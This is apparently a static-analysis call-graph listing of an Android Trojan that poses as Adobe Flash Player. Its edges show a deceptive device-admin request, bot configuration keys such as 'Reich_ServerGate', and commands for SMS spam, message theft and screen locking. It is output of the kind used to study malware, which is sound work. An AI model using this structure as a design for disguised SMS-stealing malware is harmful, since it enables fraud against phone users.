VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\rTalkTime: ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("sdcard/") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: int length()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: $r21 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("MacrosAState", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Throwable: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>("Reich_ServerGate", r1) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.webkit.WebViewClient: void <init>()>() in <com.adobe.flashplayer_.Prefs$navW: void <init>(com.adobe.flashplayer_.Prefs)> ==> <android.webkit.WebViewClient: void <init>()>
VIRTUAL edge: $r20 = virtualinvoke $r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r34 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("sentSpam") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r4.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r13) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke $r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: $r22 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotVer", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r2 = virtualinvoke r0.<com.adobe.flashplayer_.adobeCore: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.adobeCore: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.adobeCore: android.content.Intent getIntent()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.ADOBEcoreZa dummyMainMethod_com_adobe_flashplayer___ADOBEcoreZa(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
SPECIAL edge: specialinvoke r4.<java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>($r5) in <com.adobe.flashplayer_.FlashY: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>
VIRTUAL edge: $z1 = virtualinvoke $r21.<java.lang.String: boolean contains(java.lang.CharSequence)>("A") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.AdobeFlashCore: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.AdobeFlashCore dummyMainMethod_com_adobe_flashplayer___AdobeFlashCore(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeFlashCore: void <init>()>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>($r21, r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\n") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashARM: android.content.ComponentName startService(android.content.Intent)>(r2) in <com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)> ==> <android.content.ContextWrapper: android.content.ComponentName startService(android.content.Intent)>
VIRTUAL edge: $r1 = virtualinvoke r2.<java.io.BufferedReader: java.lang.String readLine()>() in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)> ==> <java.io.BufferedReader: java.lang.String readLine()>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r11) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: $r9 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotVer", $r4) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("keySmsGate") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: $r11 = specialinvoke r0.<com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotLocation", $r1) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r8) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r21 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_SMSGate", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke $r0.<com.adobe.flashplayer_.AdobeUtil: android.os.IBinder onBind(android.content.Intent)>(null) in <dummyMainClass: com.adobe.flashplayer_.AdobeUtil dummyMainMethod_com_adobe_flashplayer___AdobeUtil(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeUtil: android.os.IBinder onBind(android.content.Intent)>
VIRTUAL edge: virtualinvoke r4.<java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r9 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotVer") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("+") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>(java.lang.String)>($r1) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: r30 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r9, $r18, "sentSpam:Executed", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
SPECIAL edge: specialinvoke r2.<android.content.Intent: void <init>(java.lang.String)>("android.app.action.ADD_DEVICE_ADMIN") in <com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)> ==> <android.content.Intent: void <init>(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeZCore: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.AdobeZCore: android.os.IBinder onBind(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeZCore: android.content.Intent getIntent()>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r2 = specialinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)>("Reich_ServerGate") in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)>
STATIC edge: r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r11) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r11 = virtualinvoke $r11.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("#", "W") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r5 = specialinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>("c", $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>
STATIC edge: r7 = staticinvoke <android.telephony.SmsMessage: android.telephony.SmsMessage createFromPdu(byte[])>($r15) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.telephony.SmsMessage: android.telephony.SmsMessage createFromPdu(byte[])>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: staticinvoke <java.lang.System: void exit(int)>(0) in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <java.lang.System: void exit(int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.AdobeUtil: android.os.IBinder onBind(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeUtil: android.content.Intent getIntent()>
SPECIAL edge: $r17 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("Reich_ServerGate") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(":Executed:HTTP") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.AdobeUtil: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.AdobeUtil dummyMainMethod_com_adobe_flashplayer___AdobeUtil(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeUtil: void <init>()>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("forceLock[") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke r2.<android.content.Intent: android.content.Intent putExtra(java.lang.String,java.lang.String)>("android.app.extra.ADD_EXPLANATION", "FLASH_PLUGIN_INSTALLATION\n\n\u0423\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u0438 \u0440\u0435\u0433\u0438\u0441\u0442\u0440\u0430\u0446\u0438\u044f \u043a\u043e\u043c\u043f\u043e\u043d\u0435\u043d\u0442\u043e\u0432 com.adobe.flashplayer.\n\n\u041c\u043e\u0434\u0443\u043b\u044c \u0431\u0443\u0434\u0435\u0442 \u0437\u0430\u0440\u0435\u0433\u0438\u0441\u0442\u0440\u0438\u0440\u043e\u0432\u0430\u043d \u043a\u0430\u043a Adobe Flash Player.\n\nFor get more information about us, please visit http://adobe.com.") in <com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)> ==> <android.content.Intent: android.content.Intent putExtra(java.lang.String,java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r4.<java.lang.String: void <init>(byte[],java.lang.String)>($r15, "UTF-8") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: void <init>(byte[],java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r2.<java.io.BufferedReader: void <init>(java.io.Reader)>(r3) in <com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)> ==> <java.io.BufferedReader: void <init>(java.io.Reader)>
VIRTUAL edge: virtualinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r24) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.FlashW: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.FlashW dummyMainMethod_com_adobe_flashplayer___FlashW(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashW: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.StringBuffer: java.lang.String toString()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r1) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r4.<java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>($r5) in <com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>
STATIC edge: r30 = staticinvoke <android.net.Uri: android.net.Uri parse(java.lang.String)>("content://sms/sent") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.net.Uri: android.net.Uri parse(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("Reich_ServerGate", $r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
VIRTUAL edge: r3 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("macros") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void <init>()>() in <com.adobe.packages.BK: void <init>()> ==> <android.app.Activity: void <init>()>
STATIC edge: r8 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("wifiOn") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r2.<java.io.BufferedReader: java.lang.String readLine()>() in <com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)> ==> <java.io.BufferedReader: java.lang.String readLine()>
VIRTUAL edge: r1 = virtualinvoke r3.<java.io.File: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: java.lang.String toString()>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("getMessages") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
